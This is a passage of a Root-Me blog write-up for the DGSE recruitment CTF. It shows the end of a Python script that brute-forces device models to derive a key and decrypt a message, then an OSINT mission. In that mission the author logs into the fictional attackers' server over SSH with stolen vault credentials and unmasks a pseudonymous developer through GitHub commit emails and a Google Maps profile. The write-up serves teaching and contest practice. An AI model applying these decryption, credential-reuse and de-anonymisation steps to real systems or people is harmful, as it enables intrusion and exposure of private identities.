+</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="n">derive_key</span><span class="p">(</span><span class="n">device_id</span><span class="p">,</span> <span class="n">STATIC_SALT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">decrypted</span> <span class="o">=</span> <span class="n">try_decrypt</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">decrypted</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Success with </span><span class="si">{</span><span class="n">model</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">brand</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted message: </span><span class="si">{</span><span class="n">decrypted</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">successful_combinations</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;model&#39;</span><span class="p">:</span> <span class="n">model</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;brand&#39;</span><span class="p">:</span> <span class="n">brand</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;device_id&#39;</span><span class="p">:</span> <span class="n">device_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;decrypted&#39;</span><span class="p">:</span> <span class="n">decrypted</span>
+</span></span><span class="line"><span class="cl">                <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">successful_combinations</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Bruteforce device model and brand for message decryption&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--models&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;File containing list of device models&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--message&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Encrypted message to decrypt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Loading wordlists...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">models</span> <span class="o">=</span> <span class="n">load_wordlist</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">models</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">models</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error: Empty wordlist(s)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Loaded </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">models</span><span class="p">)</span><span class="si">}</span><span class="s2"> models&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Total combinations to try: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">models</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Starting bruteforce...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="n">bruteforce_message</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">message</span><span class="p">,</span> <span class="n">models</span><span class="p">,</span> <span class="p">[</span><span class="n">BRAND</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">results</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Successful combinations:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Model: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;model&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Brand: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;brand&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Device ID: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;device_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decrypted: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;decrypted&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">No successful combinations found&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>The resolution script above can be used to perform the calculation, testing all the Google models.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 solve.py --models models.lst --message <span class="s2">&#34;//5PBsYWhHlgqhVgG1omUyevzmlErLZVsTCLO78Rbb9qBMPnsKCS5/RZ4GEdWRBPiZ4BtO5h7j2PuIutfqf7ag==&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Successful combinations:
+</span></span><span class="line"><span class="cl">Model: Yellowstone
+</span></span><span class="line"><span class="cl">Brand: Google
+</span></span><span class="line"><span class="cl">Device ID: +XcrExWo/CpoBpXDdFL0bX0GJoWEd53YMmVVM6YABtM<span class="o">=</span>
+</span></span><span class="line"><span class="cl">Decrypted: Keep this safe. RM<span class="o">{</span>788e6f3e63e945c2a0f506da448e0244ac94f7c4<span class="o">}</span>
+</span></span></code></pre></div><p>We then get the flag, the old phone being a Google Yellowstone, or more precisely a tablet called &ldquo;Project Tango&rdquo;:</p>
+<ul>
+<li>Flag: <strong>RM{788e6f3e63e945c2a0f506da448e0244ac94f7c4}</strong></li>
+</ul>
+<h2 id="mission-6---osint">Mission 6 - OSINT</h2>
+<p><strong>Statement</strong>:</p>
+<p>You have brilliantly carried out all the tasks assigned to you, from identifying the attacking group to breaking it in. However, one question remains: who is really behind this group?</p>
+<p>We are entrusting you with this final mission to find and stop the NullVastation group once and for all. We would like to obtain the first and last name of one of its members. It&rsquo;s possible that, during the other missions, you picked up clues that could help you identify him.</p>
+<p>Good luck, agent.</p>
+<p><strong>Solving</strong>:</p>
+<p>For this very last mission, we have no link or file to download to start the challenge, but we are told that during the other missions, certain clues may help us identify the group. We&rsquo;re looking for a first and last name, and one of the mission objectives clearly states &ldquo;<strong>If necessary, infiltrate their servers</strong>&rdquo;.</p>
+<p>This instruction provides guidance on how to infiltrate the attacking group&rsquo;s servers. One of the first things that comes to mind is the various logins and passwords found in the group&rsquo;s KeePass safe during <strong>mission 4</strong>. A lot of access seems useless given that we don&rsquo;t have the URLs or applications to use them (AWS, VPN, Grafana, Gitlab).</p>
+<p>All that&rsquo;s left is SSH identifiers, where there&rsquo;s an interesting note:</p>
+<ul>
+<li>SSH password for the attacking machine. The IP address changes regularly, please refer to the last operation to obtain it.</li>
+</ul>
+<p>We learn that the IP address of this machine changes regularly, but that we can refer to the last operation to identify it. This leads us to believe that during <strong>mission 2</strong>, we had to identify the IP address of the attacking server, which was <strong>163.172.67.201</strong>, the same IP used to recover the encrypted messages during <strong>mission 5</strong>.</p>
+<p>It is possible to combine this information to connect via SSH to the attacking server, which contains attack tools.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image55.png"
+        data-srcset="/assets/images/writeups/dgse/image55.png, /assets/images/writeups/dgse/image55.png 1.5x, /assets/images/writeups/dgse/image55.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image55.png"
+        title="ssh_connexion" /></p>
+<p>One of the &ldquo;<strong>nightshade</strong>&rdquo; tools is none other than the analysed malware that infected the machine in mission 3. However, unlike the machine analysed, here the code is not compiled, so it&rsquo;s easier to read, but above all we have the developer&rsquo;s documentation, which shows how to use the malware.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image56.png"
+        data-srcset="/assets/images/writeups/dgse/image56.png, /assets/images/writeups/dgse/image56.png 1.5x, /assets/images/writeups/dgse/image56.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image56.png"
+        title="docs_and_code" /></p>
+<p>On reading the tool&rsquo;s documentation, we notice the presence of a pseudonym &ldquo;voidSyn42&rdquo;. This markdown documentation structure seems to refer to the classic GitHub tool format.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image57.png"
+        data-srcset="/assets/images/writeups/dgse/image57.png, /assets/images/writeups/dgse/image57.png 1.5x, /assets/images/writeups/dgse/image57.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image57.png"
+        title="Github_search" /></p>
+<p>After a search on GitHub, we found a profile with the attacking group&rsquo;s logo as its profile picture, but which does not contain the malware code, which must be a private repository. We do, however, have the two other tools present on the server published on his profile, clearly showing the correspondence.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image58.png"
+        data-srcset="/assets/images/writeups/dgse/image58.png, /assets/images/writeups/dgse/image58.png 1.5x, /assets/images/writeups/dgse/image58.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image58.png"
+        title="GitHub_profile" /></p>
+<p>From this GitHub profile, the aim is to pivot on the nickname to obtain an even more useful piece of information when searching for information: its e-mail address.</p>
+<p>To do this, there are various tools available to extract an e-mail address from a GitHub account, such as GitFive, but here we prefer the more traditional method of analyzing commits.</p>
+<p>When a user uploads code to GitHub, it is mandatory to enter a username and e-mail address. This can be found on any of the user&rsquo;s commits by adding a &ldquo;<strong>.patch</strong>&rdquo; at the end.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image59.png"
+        data-srcset="/assets/images/writeups/dgse/image59.png, /assets/images/writeups/dgse/image59.png 1.5x, /assets/images/writeups/dgse/image59.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image59.png"
+        title="commit" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image60.png"
+        data-srcset="/assets/images/writeups/dgse/image60.png, /assets/images/writeups/dgse/image60.png 1.5x, /assets/images/writeups/dgse/image60.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image60.png"
+        title="commit_with_email" /></p>
+<p>We then obtain a crucial new piece of information, his e-mail address “syn.pl42@proton.me”. However, we&rsquo;re still missing his first and last name.</p>
+<p>Numerous tools (holele, epeios, osint.industries&hellip;) exist to check on which sites this e-mail is registered, in the hope of finding the information we&rsquo;re looking for.</p>
+<p>With one of these tools, we quickly observe that a Google account has been created with the same e-mail address, and that the person has already left reviews on Google Maps, making his profile, first and last name public.</p>
+<ul>
+<li><a href="https://www.google.com/maps/contrib/117202825321446198923" target="_blank" rel="noopener noreffer ">https://www.google.com/maps/contrib/117202825321446198923</a></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image61.png"
+        data-srcset="/assets/images/writeups/dgse/image61.png, /assets/images/writeups/dgse/image61.png 1.5x, /assets/images/writeups/dgse/image61.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image61.png"
+        title="google_profile" /></p>
+<p>Our mission ends here, we get his first and last name.</p>
+<ul>
+<li>Flag: <strong>RM{lapresse.pierre}</strong></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-05-07</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.root-me.org/posts/writeup_dgse/" data-title="Writeup - DGSE Recruitment CTF" data-via="rootme_org" data-hashtags="dgse,writeup,solution"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.root-me.org/posts/writeup_dgse/" data-hashtag="dgse"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.root-me.org/posts/writeup_dgse/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/dgse/">dgse</a>,&nbsp;<a href="/tags/writeup/">writeup</a>,&nbsp;<a href="/tags/solution/">solution</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/writeup_comcyber_marine/" class="prev" rel="prev" title="Writeup - ComCyber - Marine Nationale Recrutement CTF"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Writeup - ComCyber - Marine Nationale Recrutement CTF</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
